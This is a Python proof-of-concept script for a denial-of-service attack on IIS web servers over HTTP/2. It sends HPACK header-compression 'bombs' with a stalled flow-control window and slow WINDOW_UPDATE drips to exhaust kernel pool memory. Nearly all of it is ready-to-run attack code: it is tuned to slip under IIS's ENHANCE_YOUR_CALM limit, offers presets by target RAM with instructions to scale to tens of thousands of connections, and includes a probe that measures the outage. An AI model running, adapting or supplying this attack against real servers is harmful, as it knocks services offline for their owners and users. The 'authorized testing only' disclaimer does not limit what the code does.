#!/usr/bin/env python3
"""
IIS HPACK Bomb + Window Stall — DoS PoC

Exploits HTTP/2 HPACK indexed references to exhaust IIS kernel pool memory.
Includes built-in accessibility probe to measure denial-of-service impact.

Key parameters tuned for IIS:
  - :scheme https (static table index 7, NOT 6)
  - :authority localhost
  - 900 headers/stream (under ENHANCE_YOUR_CALM threshold of ~910)
  - INITIAL_WINDOW_SIZE=0 (window stall)
  - 10s WINDOW_UPDATE drip (beats Timer_MinBytesPerSecond ~15s)

Usage:
  # Verify encoding first
  python3 iis_hpack_dos.py --host <IP> --port 443 --mode verify

  # Attack — choose preset by target RAM size
  python3 iis_hpack_dos.py --host <IP> --port 443 --mode attack --preset 8gb
  python3 iis_hpack_dos.py --host <IP> --port 443 --mode attack --preset 32gb
  python3 iis_hpack_dos.py --host <IP> --port 443 --mode attack --preset 64gb

  # Custom attack parameters
  python3 iis_hpack_dos.py --host <IP> --port 443 --mode attack -n 5000 --hold 120

RESEARCH PoC FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.request

# ─── HTTP/2 Constants ───

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FRAME_HEADERS       = 0x1
FRAME_SETTINGS      = 0x4
FRAME_PING          = 0x6
FRAME_GOAWAY        = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION  = 0x9

FLAG_END_STREAM  = 0x1
FLAG_END_HEADERS = 0x4
FLAG_ACK         = 0x1

SETTINGS_ENABLE_PUSH        = 0x2
SETTINGS_INITIAL_WINDOW_SIZE = 0x4

MAX_FRAME_SIZE = 16384

# ─── Frame Helpers ───

def frame(ftype, flags, stream_id, payload):
    hdr = struct.pack("!I", len(payload))[1:]
    hdr += struct.pack("!BB", ftype, flags)
    hdr += struct.pack("!I", stream_id)
    return hdr + payload


def settings_frame(params, ack=False):
    if ack:
        return frame(FRAME_SETTINGS, FLAG_ACK, 0, b"")
    payload = b""
    for pid, val in params:
        payload += struct.pack("!HI", pid, val)
    return frame(FRAME_SETTINGS, 0, 0, payload)


def window_update_frame(stream_id, increment):
    return frame(FRAME_WINDOW_UPDATE, 0, stream_id, struct.pack("!I", increment))


# ─── HPACK Bomb Builder ───

def build_hpack_bomb(num_headers):
    """
    900 headers from 913 wire bytes.
    Static index 7 = :scheme https (NOT 6 which is http).
    """
    block = bytearray()
    block.append(0x80 | 2)        # :method GET (static index 2)
    block.append(0x80 | 4)        # :path / (static index 4)
    block.append(0x80 | 7)        # :scheme https (static index 7) ← CORRECT
    block.append(0x41)            # :authority (literal w/ indexing, name index 1)
    block.append(0x09)            # value length 9
    block.extend(b"localhost")    # value
    # Insert bomb entry into dynamic table
    block.append(0x40)            # literal w/ indexing, new name
    block.append(0x01)            # name length 1
    block.append(ord("a"))        # name = "a"
    block.append(0x00)            # value length 0
    # Indexed references to entry 62 ("a": "")
    refs = num_headers - 5
    if refs > 0:
        block.extend(b"\xbe" * refs)
    return bytes(block)


def split_into_frames(stream_id, header_block):
    frames = []
    offset = 0
    first = True
    while offset < len(header_block):
        chunk = header_block[offset:offset + MAX_FRAME_SIZE]
        offset += len(chunk)
        is_last = (offset >= len(header_block))
        if first:
            flags = FLAG_END_STREAM
            if is_last:
                flags |= FLAG_END_HEADERS
            frames.append(frame(FRAME_HEADERS, flags, stream_id, chunk))
            first = False
        else:
            flags = FLAG_END_HEADERS if is_last else 0
            frames.append(frame(FRAME_CONTINUATION, flags, stream_id, chunk))
    return frames


# ─── Connection ───

class H2Conn:
    def __init__(self, host, port, conn_id=0):
        self.host = host
        self.port = port
        self.conn_id = conn_id
        self.sock = None
        self.stream_ids = []
        self.active = False

    def connect(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(15)
        raw.connect((self.host, self.port))
        self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        if self.sock.selected_alpn_protocol() != "h2":
            raise RuntimeError("ALPN not h2")

    def handshake(self):
        self.sock.sendall(H2_PREFACE)
        self.sock.sendall(settings_frame([
            (SETTINGS_ENABLE_PUSH, 0),
            (SETTINGS_INITIAL_WINDOW_SIZE, 0),
        ]))
        self._drain(timeout=2.0)
        self.sock.sendall(settings_frame([], ack=True))
        self.active = True

    def send_bombs(self, hpack_block, num_streams):
        total_wire = 0
        for i in range(num_streams):
            sid = 2 * i + 1
            self.stream_ids.append(sid)
            for f in split_into_frames(sid, hpack_block):
                self.sock.sendall(f)
                total_wire += len(f)
        self._drain(timeout=1.0)
        return total_wire

    def hold_with_drip(self, hold_seconds, drip_interval):
        t0 = time.monotonic()
        drip_count = 0
        while time.monotonic() - t0 < hold_seconds and self.active:
            wait_until = time.monotonic() + drip_interval
            while time.monotonic() < wait_until:
                remaining = wait_until - time.monotonic()
                if remaining <= 0:
                    break
                self._drain(timeout=min(remaining, 5.0))
            if not self.active:
                break
            try:
                self.sock.sendall(window_update_frame(0, 1))
                for sid in self.stream_ids:
                    self.sock.sendall(window_update_frame(sid, 1))
                drip_count += 1
            except (BrokenPipeError, ConnectionResetError, OSError):
                self.active = False
                break

    def _drain(self, timeout=1.0):
        self.sock.settimeout(timeout)
        try:
            while True:
                data = self.sock.recv(65536)
                if not data:
                    self.active = False
                    return
                off = 0
                while off + 9 <= len(data):
                    length = (data[off] << 16) | (data[off+1] << 8) | data[off+2]
                    ftype = data[off+3]
                    flags = data[off+4]
                    payload = data[off+9:off+9+length]
                    off += 9 + length
                    if ftype == FRAME_PING and not (flags & FLAG_ACK):
                        try:
                            self.sock.sendall(frame(FRAME_PING, FLAG_ACK, 0, payload))
                        except OSError:
                            self.active = False
                            return
                    elif ftype == FRAME_GOAWAY:
                        self.active = False
                        return
        except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
            pass
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.active = False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


# ─── Accessibility Probe ───

def probe_accessibility(host, port, results, stop_event, interval=5):
    """Probe target HTTPS every `interval` seconds, record results."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = f"https://{host}:{port}/"
    t0 = time.monotonic()

    while not stop_event.is_set():
        elapsed = time.monotonic() - t0
        try:
            req = urllib.request.Request(url)
            start = time.monotonic()
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            latency = (time.monotonic() - start) * 1000
            results.append((elapsed, resp.status, latency))
        except Exception:
            results.append((elapsed, 0, 5000))
        stop_event.wait(interval)


# ─── Verify Mode ───

def run_verify(host, port):
    """Verify HPACK encoding and ENHANCE_YOUR_CALM threshold."""
    print(f"Verifying H2 encoding against {host}:{port}\n")

    for count in [10, 100, 500, 900, 1000, 5000]:
        hpack = build_hpack_bomb(count)
        try:
            c = H2Conn(host, port)
            c.connect()
            # Handshake WITHOUT window stall for verify mode
            c.sock.sendall(H2_PREFACE)
            c.sock.sendall(settings_frame([(SETTINGS_ENABLE_PUSH, 0)]))
            c._drain(2.0)
            c.sock.sendall(settings_frame([], ack=True))

            for f in split_into_frames(1, hpack):
                c.sock.sendall(f)

            time.sleep(1)
            c.sock.settimeout(2)
            result = "no response"
            try:
                while True:
                    data = c.sock.recv(65536)
                    if not data:
                        break
                    off = 0
                    while off + 9 <= len(data):
                        ln = (data[off]<<16)|(data[off+1]<<8)|data[off+2]
                        ft = data[off+3]
                        sid = struct.unpack("!I", data[off+5:off+9])[0] & 0x7FFFFFFF
                        pay = data[off+9:off+9+ln]
                        off += 9 + ln
                        if ft == 0x3 and sid == 1:
                            err = struct.unpack("!I", pay[:4])[0] if len(pay) >= 4 else 0
                            names = {0:"NO_ERROR", 1:"PROTOCOL_ERROR", 0xb:"ENHANCE_YOUR_CALM"}
                            result = f"RST 0x{err:x} ({names.get(err, '?')})"
                            break
                        elif ft == 0x1 and sid == 1:
                            result = "ACCEPTED (HEADERS response)"
                            break
                    if result != "no response":
                        break
            except (socket.timeout, ssl.SSLWantReadError):
                pass
            c.close()
        except Exception as e:
            result = f"ERROR: {e}"

        status = "OK" if "ACCEPTED" in result else "BLOCKED" if "ENHANCE" in result else "FAIL"
        print(f"  headers={count:5d}  wire={len(hpack):6d}B  [{status:7s}]  {result}")

    print(f"\nExpected: <=900 -> ACCEPTED, >=1000 -> ENHANCE_YOUR_CALM")
    print(f"If all show PROTOCOL_ERROR -> encoding bug (check :scheme index)")


# ─── Attack Mode ───

def run_attack(args):
    num_connections = args.connections
    num_streams = args.streams
    num_headers = args.headers
    hold_seconds = args.hold
    drip_interval = args.drip_interval

    hpack_block = build_hpack_bomb(num_headers)
    wire_per_stream = len(hpack_block)

    print(f"\n{'=' * 65}")
    print(f"  IIS HPACK Bomb + Window Stall")
    print(f"  Target:      {args.host}:{args.port}")
    print(f"  Connections: {num_connections}")
    print(f"  Streams:     {num_streams}/conn, {num_headers} headers/stream")
    print(f"  HPACK wire:  {wire_per_stream} bytes/stream")
    print(f"  Hold:        {hold_seconds}s, drip every {drip_interval}s")
    print(f"  Probe:       {'enabled' if not args.no_probe else 'disabled'}")
    print(f"{'=' * 65}\n")

    # Start accessibility probe
    probe_results = []
    probe_stop = threading.Event()
    if not args.no_probe:
        probe_thread = threading.Thread(
            target=probe_accessibility,
            args=(args.host, args.port, probe_results, probe_stop, 5),
            daemon=True)
        probe_thread.start()
        time.sleep(1)  # Let first probe run

    # Phase 1: Connect
    print(f"[*] Connecting {num_connections} sessions...")
    connections = []
    lock = threading.Lock()
    t_start = time.monotonic()

    def connect_worker(i):
        c = H2Conn(args.host, args.port, i)
        try:
            c.connect()
            c.handshake()
            with lock:
                connections.append(c)
        except Exception:
            c.close()

    threads = []
    for i in range(num_connections):
        t = threading.Thread(target=connect_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)
    for t in threads:
        t.join(timeout=60)

    t_connect = time.monotonic() - t_start
    print(f"    {len(connections)}/{num_connections} connected in {t_connect:.1f}s")
    if not connections:
        print("[!] No connections. Exiting.")
        probe_stop.set()
        return

    # Phase 2: Send bombs
    print(f"[*] Sending HPACK bombs ({len(connections)} x {num_streams} streams)...")
    total_wire = 0
    t_bomb = time.monotonic()

    def bomb_worker(c):
        nonlocal total_wire
        try:
            wire = c.send_bombs(hpack_block, num_streams)
            with lock:
                total_wire += wire
        except Exception:
            c.active = False

    threads = []
    for c in connections:
        t = threading.Thread(target=bomb_worker, args=(c,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=60)

    t_sent = time.monotonic() - t_bomb
    print(f"    Wire: {total_wire / 1024 / 1024:.1f} MB in {t_sent:.1f}s")

    # Phase 3: Hold with drip
    print(f"[*] Holding for {hold_seconds}s...")
    threads = []
    for c in connections:
        t = threading.Thread(target=c.hold_with_drip,
                             args=(hold_seconds, drip_interval), daemon=True)
        t.start()
        threads.append(t)
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")

    # Stop probe and report
    probe_stop.set()
    t_total = time.monotonic() - t_start
    active = sum(1 for c in connections if c.active)

    print(f"\n{'=' * 65}")
    print(f"  RESULTS")
    print(f"{'=' * 65}")
    print(f"  Total time:     {t_total:.0f}s")
    print(f"  Connections:    {active}/{len(connections)} still active")
    print(f"  Wire uploaded:  {total_wire / 1024 / 1024:.1f} MB")
    print(f"  Total streams:  {len(connections) * num_streams:,}")

    if probe_results:
        print(f"\n  Accessibility probe ({len(probe_results)} samples):")
        accessible = sum(1 for _, status, _ in probe_results if status == 200)
        denied = len(probe_results) - accessible
        print(f"    Accessible: {accessible}/{len(probe_results)}")
        print(f"    Denied:     {denied}/{len(probe_results)}")

        # Find denial window
        first_deny = next((t for t, s, _ in probe_results if s != 200), None)
        last_deny_t = 0
        for t, s, _ in probe_results:
            if s != 200:
                last_deny_t = t
        if first_deny is not None:
            print(f"    First denial at:  t+{first_deny:.0f}s")
            print(f"    Last denial at:   t+{last_deny_t:.0f}s")
            print(f"    Denial window:    ~{last_deny_t - first_deny:.0f}s")

        print(f"\n  Timeline:")
        for elapsed, status, latency in probe_results:
            indicator = "OK " if status == 200 else "ERR"
            bar = "#" * min(50, int(latency / 100)) if status == 200 else "XXXXX"
            print(f"    t+{elapsed:6.0f}s  [{indicator}]  {latency:7.0f}ms  {bar}")

    print()
    for c in connections:
        c.close()


# ─── Presets ───

PRESETS = {
    "8gb":  {"connections": 2000,  "streams": 100, "headers": 900, "hold": 300, "drip_interval": 5},
    "32gb": {"connections": 2000,  "streams": 100, "headers": 900, "hold": 300, "drip_interval": 5},
    "64gb": {"connections": 2000,  "streams": 100, "headers": 900, "hold": 300, "drip_interval": 5},
    "96gb": {"connections": 1000,  "streams": 100, "headers": 900, "hold": 300, "drip_interval": 5},
}
# NOTE: These presets are per-process. Launch multiple processes in parallel:
#   8 GB:  5 processes   (5 x 2000 = 10,000 connections)
#   32 GB: 10 processes  (10 x 2000 = 20,000 connections)
#   64 GB: 20 processes  (20 x 2000 = 40,000 connections)
#   96 GB: 50 processes  (50 x 1000 = 50,000 connections)


def main():
    parser = argparse.ArgumentParser(
        description="IIS HPACK Bomb + Window Stall — DoS PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Presets (--preset) — per process, launch N processes in parallel via PowerShell Start-Job:
  8gb    2,000 conns/proc x  5 procs = 10,000 total
  32gb   2,000 conns/proc x 10 procs = 20,000 total
  64gb   2,000 conns/proc x 20 procs = 40,000 total
  96gb   1,000 conns/proc x 50 procs = 50,000 total

Modes (--mode):
  verify   Test encoding correctness and ENHANCE_YOUR_CALM threshold
  attack   Run the actual DoS attack with accessibility probing

Examples:
  %(prog)s --host 10.0.0.1 --port 443 --mode verify
  %(prog)s --host 10.0.0.1 --port 443 --mode attack --preset 32gb
  %(prog)s --host 10.0.0.1 --port 443 --mode attack -n 5000 --hold 60
""")
    parser.add_argument("--host", required=True, help="Target IP/hostname")
    parser.add_argument("--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("--mode", choices=["verify", "attack"], default="verify",
                        help="verify = test encoding; attack = run DoS")
    parser.add_argument("--preset", choices=PRESETS.keys(),
                        help="Use preset for target RAM size")
    parser.add_argument("-n", "--connections", type=int, default=2500,
                        help="Connections (default: 2500)")
    parser.add_argument("--streams", type=int, default=100,
                        help="Streams per connection (default: 100)")
    parser.add_argument("--headers", type=int, default=900,
                        help="Headers per stream (default: 900, max for IIS)")
    parser.add_argument("--hold", type=int, default=120,
                        help="Hold time seconds (default: 120)")
    parser.add_argument("--drip-interval", type=int, default=5,
                        help="WINDOW_UPDATE drip interval (default: 5)")
    parser.add_argument("--no-probe", action="store_true",
                        help="Disable accessibility probe")

    args = parser.parse_args()

    if args.preset:
        preset = PRESETS[args.preset]
        args.connections = preset["connections"]
        args.streams = preset["streams"]
        args.headers = preset["headers"]
        args.hold = preset["hold"]
        args.drip_interval = preset["drip_interval"]

    if args.headers > 900:
        print(f"Warning: {args.headers} headers may trigger ENHANCE_YOUR_CALM. Clamping to 900.")
        args.headers = 900

    if args.mode == "verify":
        run_verify(args.host, args.port)
    else:
        run_attack(args)


if __name__ == "__main__":
    main()
